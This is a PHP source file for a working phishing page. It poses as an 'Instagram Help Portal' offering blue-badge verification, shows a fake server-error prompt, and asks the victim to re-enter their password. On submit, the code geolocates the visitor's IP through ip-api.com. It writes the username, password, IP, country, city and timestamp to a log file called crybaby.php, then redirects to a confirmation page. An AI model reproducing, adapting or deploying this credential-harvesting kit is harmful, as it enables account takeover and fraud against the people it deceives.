<?php

ob_start();
session_start();
error_reporting(E_ALL);
$image_url=$_SESSION['pp'];
set_time_limit(0);
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}
$username = $_GET["username"];

if($_POST){
    $username=$_GET["username"];
    $password=$_POST["password"];
    $ip=$_SERVER["REMOTE_ADDR"];
    $konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');
include('vendor/autoload.php');
$cur_time=date("d-m-Y H:i:s");

    $file = fopen('crybaby.php', 'a');
fwrite($file, "
<html>
<head>
    <meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#0000a0'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='darkblue'>

<font color='red'>Kullanıcı Adı: </font><font color='white'>".$username."</font><br>
<font color='red'> Şifre: </font><font color='white'>".$password."</font><br>
<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
<hr>


"); 

fclose($file);
echo '';
  
   header("Location: confirmed.php?username=$username");
}



?>

                        <html>
                            <head>
                                <meta charset='utf-8'>
                                <meta name='viewport' content='width=device-width, initial-scale=1'>
                                <title>Blue Badge Support @<?php echo $username
                            ?></title>
                                <link href='https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css' rel='stylesheet'>
                                <link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.0.3/css/font-awesome.css' rel='stylesheet'>
                                <link rel="stylesheet" type="text/css" href="style.css">
                                <script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
                                <script type='text/javascript' src='https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js'></script>
                                <script type='text/javascript' src='https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js'></script>
                            </head>
                            <body oncontextmenu='return false' class='snippet-body'>
                            
    <div class="card card0">
        <div class="d-flex flex-lg-row flex-column-reverse">
            <div class="card card1">
                <div class="row justify-content-center my-auto">
                    <div class="col-md-8 col-10 my-5">
                        <div class="row justify-content-center px-3 mb-3"> <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" style="margin-top:-20px"> </div>
                        <h5 style="color:grey;" class="mb-5 text-center heading"> Blue Badge Center&nbsp;<img style="width:16px;" src="https://i.imgyukle.com/2020/02/19/niuzAb.png"></h5>
                       
                                                <center><img src="<?php echo $image_url;?>" alt="<?php echo $username;?>" of photo width=150 style="border-radius:50%;margin-top:-10px;">
                            <br>
                            
                            <br>
                             <h6 style="font-size:13px;color:red;"  class="msg-info">Sorry, there was an error with our server. Please double-check your password.</h6>
                        <div class="form-group"> 
                        <form method="post"> <input style="top:10px;" required=""  type="password" id="psw" name="password" placeholder="Password" class="form-control"> </div>
                        <div style="top: 10px;" class="row justify-content-center my-3 px-3"> <button name="buton" class="btn-block btn-color">Continue As @<?php echo $username?></button> </div></form>
                        <div  style="position: relative; margin-left:100px;"  class="row justify-content-center my-2"> <a href="https://www.instagram.com/accounts/password/reset/"><small  class="text-muted">Forgot Password?</small></a> </div>
                    </div>
                </div>
                <div class="bottom text-center mb-5">
                    <p href="#" class="sm-text mx-auto mb-3">Don't have an account?<br><br><button class="btn btn-white ml-2">Sign Up</button></p>

                </div>
                <style>
                	.other{
			margin-top:100px;
			bottom:1px;
			position:relative;
			border-top:1px solid #cecece;
			width:100%;

		}
                </style>
          <center> <div  class="other">
		<img src="https://marka-logo.com/wp-content/uploads/2020/04/Facebook-Logo.png" alt="fb" width="110">
	</div>
            </div>
            <div class="card card2">
                <div class="my-auto mx-md-5 px-md-5 right">
                   <h3 class="text-white">Instagram Help Portal</h3> <small class="text-white">If you are redirected to this page, your account meets our verified content requirements. Please fill out the form to verify your account.
</small>
                </div>
            </div>

        </div>
    </div>
</div>
                            <script type='text/javascript'></script>
                            </body>
                        </html>